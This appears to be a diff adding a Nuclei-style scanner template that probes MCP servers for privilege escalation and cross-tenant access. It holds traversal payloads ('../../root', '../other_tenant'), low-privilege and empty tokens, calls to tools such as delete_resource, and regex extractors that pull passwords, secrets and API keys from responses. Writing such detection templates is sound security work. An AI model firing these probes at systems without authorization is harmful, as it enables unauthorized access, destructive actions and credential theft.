@@ -1,0 +1,115 @@
+id: mcp-privilege-escalation
+
+info:
+  name: MCP Privilege Escalation
+  author: llmrt
+  severity: critical
+  description: Detects privilege escalation vulnerabilities in MCP servers including permission inheritance and cross-tenant access
+  reference:
+    - https://adversa.ai/mcp-top-25
+    - https://cwe.mitre.org/data/definitions/269.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.9
+    cwe-id: CWE-269
+  tags: mcp,privilege-escalation,idor,adversa-mcp-06,adversa-mcp-11
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/mcp"
+      - "{{BaseURL}}/api/mcp"
+      - "{{BaseURL}}/rpc"
+    
+    headers:
+      Content-Type: application/json
+      Authorization: Bearer {{token}}
+    
+    body: |
+      {
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "tools/call",
+        "params": {
+          "name": "{{tool_name}}",
+          "arguments": {
+            "user_id": "{{user_id}}",
+            "tenant_id": "{{tenant_id}}",
+            "resource_id": "{{resource_id}}"
+          }
+        }
+      }
+    
+    payloads:
+      token:
+        - "low_privilege_token"
+        - "guest_token"
+        - ""
+      
+      tool_name:
+        - "read_user_data"
+        - "get_admin_info"
+        - "list_all_users"
+        - "delete_resource"
+        - "update_permissions"
+      
+      user_id:
+        - "1"
+        - "admin"
+        - "0"
+        - "../admin"
+        - "../../root"
+      
+      tenant_id:
+        - "1"
+        - "2"
+        - "0"
+        - "admin_tenant"
+        - "../other_tenant"
+      
+      resource_id:
+        - "1"
+        - "2"
+        - "../../../sensitive_resource"
+        - "admin_resource"
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "root"
+          - "privileged"
+          - "sensitive"
+          - "password"
+          - "secret"
+          - "api_key"
+          - "token"
+        condition: or
+      
+      - type: status
+        status:
+          - 200
+      
+      - type: word
+        part: body
+        words:
+          - "unauthorized"
+          - "forbidden"
+          - "access denied"
+        negative: true
+    
+    extractors:
+      - type: json
+        part: body
+        json:
+          - '.result'
+          - '.result.data'
+      
+      - type: regex
+        part: body
+        regex:
+          - '(?i)(password|secret|api_key|token)[\s:=]+([^\s,\}]+)'
+          - '(?i)(admin|root|privileged).*?:.*?([^\s,\}]+)'
+
